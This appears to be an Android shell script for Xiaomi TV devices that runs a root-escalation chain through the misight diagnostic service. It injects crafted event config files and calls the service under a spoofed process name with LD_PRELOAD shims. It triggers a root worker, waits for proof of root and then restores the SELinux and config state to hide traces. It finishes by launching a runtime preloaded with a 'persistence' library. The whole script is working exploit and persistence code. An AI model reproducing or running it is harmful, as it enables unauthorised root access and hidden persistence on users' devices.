#!/system/bin/sh
set -u
b=/data/data/mitv.service/files/MIHDRControl
r=/data/miuilog/misight/MIHDRControl
cfg=/data/miuilog/misight/config/update1
op=${1:-apply}
[ "$op" = apply ] || [ "$op" = remove ] || exit 2
[ "$op" = remove ] || [ -f "$b/enabled" ] || exit 0
mkdir -p "$r"
chmod 0770 "$r"
nonce=$(cat /proc/sys/kernel/random/boot_id)-$(date +%s)-$$
echo "__run_id=$nonce operation=$op"
launch_runtime() {
 echo __bootstrap_done=1
 export CLASSPATH="$b/MIHDRRuntime.jar"
 export LD_LIBRARY_PATH=/vendor/lib64:/vendor/lib64/hw:/system/lib64:/system_ext/lib64
 export LD_PRELOAD="$b/libmi-persistence.so"
 exec /system/bin/app_process /system/bin MIHDRRuntime
}
if [ "$op" = apply ] && [ -d /sys/module/mi_oemabl ] && [ "$(cat /sys/module/mi_oemabl/parameters/hdr_revision 2>/dev/null)" = 2 ]; then
 echo __reused_budget_module=1
 launch_runtime
fi
if [ "$op" = apply ]; then
 echo __waiting_for_hdr_driver=1
 while [ ! -d /sys/module/kdrv_ldm_sys ] || [ ! -d /sys/module/adaptive_hdr_algo ]; do
  [ -f "$b/enabled" ] && [ ! -f "$b/stop" ] || exit 0
  sleep 1
 done
fi
echo __waiting_for_misight=1
attempt=0
while :; do
 [ "$op" = remove ] || { [ -f "$b/enabled" ] && [ ! -f "$b/stop" ]; } || { echo __readiness_cancelled=1;exit 0; }
 attempt=$((attempt+1))
 check_output=$(/system/bin/service check misight 2>&1)
 if printf '%s\n' "$check_output" | grep -q ': found'; then break;fi
 if [ "$attempt" = 1 ] || [ $((attempt%30)) = 0 ]; then
  echo "misight_wait_attempt=$attempt epoch=$(date +%s)"
  printf '%s\n' "$check_output"
 fi
 sleep 2
done
echo misight_ready_epoch=$(date +%s)
echo adbd_at_misight_ready=$(getprop init.svc.adbd)
if [ -n "$(ls -A "$cfg")" ]; then echo aborted_nonempty_diagnostic_slot=1;exit 3;fi
[ "$(sha256sum /vendor/lib/modules/kdrv_ldm_sys.ko | cut -d ' ' -f1)" = eabc6d525ddd76cfaa9855b137af2df7247bccd4ec7166edef4d0dbfae5db4cd ] || exit 4
before=$(getprop persist.sys.misight.cfg)
update_config() {
 (export LD_PRELOAD="$b/mi-service-call-args.so"; exec -a com.miui.misightservice /system/bin/service call misight 4 s16 "$1")
}
restore_config() {
 rm -f "$cfg/event.xml" "$cfg/event_upload.xml"
 if [ "$before" = 1 ]; then previous=update1;else previous=update0;fi
 update_config "$previous"
 setprop persist.sys.misight.cfg "$before"
 echo __diagnostic_config_restored=1
}
trap restore_config EXIT HUP INT TERM
sed "s/@RUN_ID@/$nonce/g;s/@OPERATION@/$op/g" "$b/boot-root.sh" >"$r/phase.sh"
chmod 0644 "$r/phase.sh"
rm -f "$r/root-proof.txt"
counter=$(cat "$b/event-counter" 2>/dev/null || echo 0)
case "$counter" in ''|*[!0-9]*) counter=0;; esac
counter=$(((counter+1)%1000000));echo "$counter" >"$b/event-counter"
case $((counter%6)) in 0) tag=961;;1) tag=962;;2) tag=963;;3) tag=964;;4) tag=966;;5) tag=967;;esac
event=${tag}099999
sed "s/@EVENT_ID@/$event/g" "$b/event.xml" >"$cfg/event.xml"
sed "s/@EVENT_ID@/$event/g" "$b/event_upload.xml" >"$cfg/event_upload.xml"
chmod 0644 "$cfg/event.xml" "$cfg/event_upload.xml"
touch -d "@$(( $(date +%s) + 315360000 ))" "$cfg/event.xml" "$cfg/event_upload.xml"
update_config update1
timeout 8 env LD_LIBRARY_PATH=/system_ext/lib64:/system/lib64:/vendor/lib64 LD_PRELOAD="$b/event${tag}.so" /system/bin/app_process /system/bin
echo event_submit_exit=$?
ready=0
for i in $(seq 1 150); do
 if grep -q "__run_id=$nonce" "$r/root-proof.txt" 2>/dev/null && grep -q __root_ready=1 "$r/root-proof.txt" 2>/dev/null; then ready=1;break;fi
 sleep .1
done
[ "$ready" = 1 ] || { echo root_worker_not_ready=1;exit 5; }
"$b/mi-temporary-access" --apply
rc=$?;echo temporary_access_exit=$rc;[ "$rc" = 0 ] || exit 6
done=0
for i in $(seq 1 400); do
 if grep -q "__run_id=$nonce" "$r/root-proof.txt" 2>/dev/null && grep -q __root_done=1 "$r/root-proof.txt" 2>/dev/null; then done=1;break;fi
 sleep .1
done
cat "$r/root-proof.txt"
cp "$r/root-proof.txt" "$b/last-root-proof.txt"
[ "$done" = 1 ] && grep -q __access_restore_done=1 "$r/root-proof.txt" 2>/dev/null && grep -q policy_restore_exit=0 "$r/root-proof.txt" || exit 7
[ "$(getenforce)" = Enforcing ] || exit 8
restore_config
trap - EXIT HUP INT TERM
if [ "$op" = remove ]; then
 echo __remove_done=1;exit 0
fi
grep -q __module_ready=1 "$r/root-proof.txt" || exit 9
[ -f "$b/enabled" ] && [ ! -f "$b/stop" ] || exit 0
launch_runtime
